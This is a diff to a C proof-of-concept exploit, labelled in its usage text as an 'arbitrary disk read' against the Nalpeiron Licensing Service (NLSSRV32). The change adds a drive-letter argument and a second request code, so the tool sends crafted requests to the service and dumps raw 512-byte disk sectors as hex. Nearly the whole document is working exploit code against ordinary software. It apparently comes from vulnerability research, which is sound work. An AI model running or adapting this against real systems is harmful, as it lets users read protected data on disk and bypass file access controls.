@@ -5,6 +5,8 @@
 #include <Windows.h>
 
 #define CALL_READ 0x12182003
+#define CALL_READ_B 0x12182006
+
 #define SEND_SIZE 0x220
 
 struct ServiceRequest {
@@ -12,7 +14,7 @@ struct ServiceRequest {
 	DWORD pid;
 	DWORD pre_check;
 	DWORD post_check;
-	DWORD unk1;
+	DWORD drive;
 	DWORD search_bytes;
 	DWORD low_offset;
 	DWORD high_offset;
@@ -106,13 +108,13 @@ static void _print_as_hex(PBYTE buf, size_t buf_len)
 
 void _usage(int argc, WCHAR* argv[]) {
 	wprintf(L"\nNalpeiron Licensing Service (NLSSRV32) arbitrary disk read\n");
-	wprintf(L"Reads 520 bytes from the primary disk at a specified offset\n\n");
-	wprintf(L"Usage: %s <offset>\n", argv[0]);
+	wprintf(L"Reads 512 bytes from the primary disk at a specified offset\n\n");
+	wprintf(L"Usage:\n\n%s <drive_letter> <offset>\n\n", argv[0]);
 }
 
 int wmain(int argc, WCHAR* argv[])
 {
-	if (argc != 2) {
+	if (argc != 3) {
 		_usage(argc, argv);
 		return 1;
 	}
@@ -120,20 +122,21 @@ int wmain(int argc, WCHAR* argv[])
 	ServiceRequest request = { 0 };
 	ServiceResponse response = { 0 };
 
-	request.call = CALL_READ;
+	request.call = CALL_READ_B;
 	request.pid = GetCurrentProcessId();
 	request.pre_check = get_rand(100, 1000);
 	request.post_check = get_check_val(request.pre_check);
 
-	DWORD offset = _wtoi(argv[1]);
+	request.drive = argv[1][0];
+	request.low_offset = _wtoi(argv[2]);
 
-	if (offset != 0 && (offset % 512 != 0)) {
+	if (request.low_offset != 0 && (request.low_offset % 512 != 0)) {
 		printf("[!] Offset needs to be a multiple of 512");
 		return 1;
 	}
 
-	printf("[+] Requesting 520 bytes at offset %d ...\n", offset);
-	request.low_offset = offset;
+	printf("[+] Requesting sector from %c: at offset %d ...\n", request.drive, request.low_offset);
+	
 
 	if (!send_and_recieve(&request, &response)) {
 		return 1;
@@ -145,7 +148,7 @@ int wmain(int argc, WCHAR* argv[])
 	}
 
 	printf("[+] Drive data [hex]:\n\n");
-	_print_as_hex(response.data, sizeof(response.data));
+	_print_as_hex(response.data, 512);
 
 	return 0;
 }
